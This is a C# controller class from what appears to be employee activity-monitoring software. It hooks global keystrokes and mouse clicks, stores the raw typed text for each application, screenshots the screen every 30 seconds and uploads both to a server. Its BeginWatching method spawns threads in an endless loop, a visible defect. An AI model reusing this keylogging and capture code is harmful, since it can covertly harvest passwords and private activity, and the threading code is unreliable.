using FlexerApp.Contexts;
using FlexerApp.Models;
using Gma.System.MouseKeyHook;
using RestSharp;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

namespace FlexerApp.Controllers
{
    public class Controller
    {
        private const string ACTIVITY_TYPE_APPLICATION = "Application";
        private const string ACTIVITY_TYPE_URL = "URL";

        private const int CaptureImageInterval = 30000;
        private const int UploadDataInterval = 30000;

        public Stopwatch stopwatch;
        public DateTime loginTime;

        private System.Timers.Timer captureImageTimer;
        private System.Timers.Timer uploadDataTimer;

        static readonly object captureLock = new object();
        static readonly object uploadLock = new object();

        private Context _contextDB = new Context();
        private IKeyboardMouseEvents m_Events;
        private List<KeyboardMouseLogModel> keyboardMouseLogList = new List<KeyboardMouseLogModel>();

        /// <summary>
        /// Begins the watching.
        /// </summary>
        public void BeginWatching()
        {
            Unsubscribe();
            Subscribe(Hook.GlobalEvents());

            while (true)
            {
                Thread captureImageThread = new Thread(new ThreadStart(CaptureImageTimer));
                captureImageThread.Start();

                Thread uploadDataThread = new Thread(new ThreadStart(UploadDataTimer));
                uploadDataThread.Start();
            }
        }

        /// <summary>
        /// Hooks the manager screenshot timer.
        /// </summary>
        private void CaptureImageTimer()
        {
            lock (captureLock)
            {
                captureImageTimer = new System.Timers.Timer(CaptureImageInterval);
                captureImageTimer.Elapsed += new ElapsedEventHandler(CaptureImageTimerElapsed);
                captureImageTimer.Enabled = true;
                Thread.Sleep(1000);
            }
        }

        /// <summary>
        /// Sends the data to server timer.
        /// </summary>
        private void UploadDataTimer()
        {
            lock (uploadLock)
            {
                uploadDataTimer = new System.Timers.Timer(UploadDataInterval);
                uploadDataTimer.Elapsed += new ElapsedEventHandler(UploadDataTimerElapsed);
                uploadDataTimer.Enabled = true;
                Thread.Sleep(1000);
            }
        }

        /// <summary>
        /// Subscribes the specified events.
        /// </summary>
        /// <param name="events">The events.</param>
        private void Subscribe(IKeyboardMouseEvents events)
        {
            m_Events = events;
            m_Events.KeyPress += HookManager_KeyPress;
            m_Events.MouseClick += HookManager_MouseClick;
        }

        /// <summary>
        /// Unsubscribes this instance.
        /// </summary>
        private void Unsubscribe()
        {
            if (m_Events == null) return;

            m_Events.KeyPress -= HookManager_KeyPress;
            m_Events.MouseClick -= HookManager_MouseClick;
            m_Events.Dispose();
            m_Events = null;
        }

        /// <summary>
        /// Handles the TimerElapsed event of the HookManager_ScreenShot control.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">The <see cref="System.Timers.ElapsedEventArgs"/> instance containing the event data.</param>
        private void CaptureImageTimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            HookManager_Screenshot();
        }

        /// <summary>
        /// Uploads the data timer elapsed.
        /// </summary>
        /// <param name="sender">The sender.</param>
        /// <param name="e">The <see cref="System.Timers.ElapsedEventArgs"/> instance containing the event data.</param>
        private void UploadDataTimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            var connector = new Connector();
            connector.SendKeyLogDataToServer();
            connector.SendLocalImageDataToServer();
        }


        /// <summary>
        /// Hooks the manager screenshot.
        /// </summary>
        private void HookManager_Screenshot()
        {
            Int32 hwnd = 0;
            hwnd = GetForegroundWindow();

            var sessionID = _contextDB.GetLoginSession().sessionID;

            if (hwnd == 0)
                return;

            string appProcessName = Process.GetProcessById(GetWindowProcessID(hwnd)).ProcessName;

            var capture = new ScreenshotLogModel();
            capture.ScreenshotLogModelId = Guid.NewGuid().ToString();
            capture.SessionID = sessionID;
            capture.ActivityName = appProcessName;
            capture.ActivityType = "Application"; //Sementara dipantek!
            capture.Image = new ScreenCapture().CaptureScreenByteArrayString(System.Drawing.Imaging.ImageFormat.Jpeg);
            capture.CaptureScreenDate = loginTime.AddTicks(stopwatch.ElapsedTicks);
            capture.IsSuccessSendToServer = false;

            _contextDB.CreateImageData(capture);
        }

        /// <summary>
        /// Handles the KeyPress event of the HookManager control.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">The <see cref="KeyPressEventArgs"/> instance containing the event data.</param>
        private void HookManager_KeyPress(object sender, KeyPressEventArgs e)
        {
            try
            {
                Int32 hwnd = 0;
                hwnd = GetForegroundWindow();

                var sessionID = _contextDB.GetLoginSession().sessionID;

                if (hwnd == 0)
                    return;

                string appProcessName = Process.GetProcessById(GetWindowProcessID(hwnd)).ProcessName;

                if (keyboardMouseLogList.Exists(monitor => monitor.ActivityName == appProcessName))
                {
                    var monitor = keyboardMouseLogList.Where(a => a.ActivityName == appProcessName).OrderByDescending(b => b.StartTime).FirstOrDefault();
                    monitor.KeyStrokeCount++;
                    monitor.InputKey = string.Concat(monitor.InputKey, e.KeyChar.ToString());
                    monitor.EndTime = loginTime.AddTicks(stopwatch.ElapsedTicks);
                }
                else
                {
                    if (keyboardMouseLogList.Count > 0)
                    {
                        foreach (var log in keyboardMouseLogList)
                            _contextDB.CreateData(log);

                        keyboardMouseLogList = new List<KeyboardMouseLogModel>();
                    }

                    var monitor = new KeyboardMouseLogModel();
                    monitor.KeyboardMouseLogModelId = Guid.NewGuid().ToString();
                    monitor.SessionID = sessionID;
                    monitor.ActivityName = appProcessName;
                    monitor.ActivityType = ACTIVITY_TYPE_APPLICATION;
                    monitor.InputKey = e.KeyChar.ToString();
                    monitor.KeyStrokeCount = 1;
                    monitor.MouseClickCount = 0;
                    monitor.StartTime = loginTime.AddTicks(stopwatch.ElapsedTicks);
                    monitor.EndTime = loginTime.AddTicks(stopwatch.ElapsedTicks);
                    monitor.IsSuccessSendToServer = false;

                    keyboardMouseLogList.Add(monitor);
                }
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        /// <summary>
        /// Handles the MouseClick event of the HookManager control.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">The <see cref="MouseEventArgs"/> instance containing the event data.</param>
        private void HookManager_MouseClick(object sender, MouseEventArgs e)
        {
            Int32 hwnd = 0;
            hwnd = GetForegroundWindow();

            var sessionID = _contextDB.GetLoginSession().sessionID;

            if (hwnd == 0)
                return;

            string appProcessName = Process.GetProcessById(GetWindowProcessID(hwnd)).ProcessName;

            if (keyboardMouseLogList.Exists(monitor => monitor.ActivityName == appProcessName))
            {
                var monitor = keyboardMouseLogList.Where(a => a.ActivityName == appProcessName).OrderByDescending(b => b.StartTime).FirstOrDefault();
                monitor.MouseClickCount++;
                monitor.EndTime = loginTime.AddTicks(stopwatch.ElapsedTicks);
            }
            else
            {
                if (keyboardMouseLogList.Count > 0)
                {
                    foreach (var log in keyboardMouseLogList)
                        _contextDB.CreateData(log);

                    keyboardMouseLogList = new List<KeyboardMouseLogModel>();
                }

                var monitor = new KeyboardMouseLogModel();
                monitor.KeyboardMouseLogModelId = Guid.NewGuid().ToString();
                monitor.SessionID = sessionID;
                monitor.ActivityName = appProcessName;
                monitor.ActivityType = ACTIVITY_TYPE_APPLICATION;
                monitor.KeyStrokeCount = 0;
                monitor.MouseClickCount = 1;
                monitor.StartTime = loginTime.AddTicks(stopwatch.ElapsedTicks);
                monitor.EndTime = loginTime.AddTicks(stopwatch.ElapsedTicks);
                monitor.IsSuccessSendToServer = false;

                keyboardMouseLogList.Add(monitor);
            }
        }


        /// <summary>
        /// Gets the foreground window.
        /// </summary>
        /// <returns></returns>
        [DllImport("user32.dll")]
        private static extern int GetForegroundWindow();

        /// <summary>
        /// Gets the window thread process identifier.
        /// </summary>
        /// <param name="hWnd">The h WND.</param>
        /// <param name="lpdwProcessId">The LPDW process identifier.</param>
        /// <returns></returns>
        [DllImport("user32.dll")]
        private static extern UInt32 GetWindowThreadProcessId(Int32 hWnd, out Int32 lpdwProcessId);

        /// <summary>
        /// Gets the window process identifier.
        /// </summary>
        /// <param name="hwnd">The HWND.</param>
        /// <returns></returns>
        private static Int32 GetWindowProcessID(Int32 hwnd)
        {
            Int32 pid = 1;
            GetWindowThreadProcessId(hwnd, out pid);
            return pid;
        }
    }
}
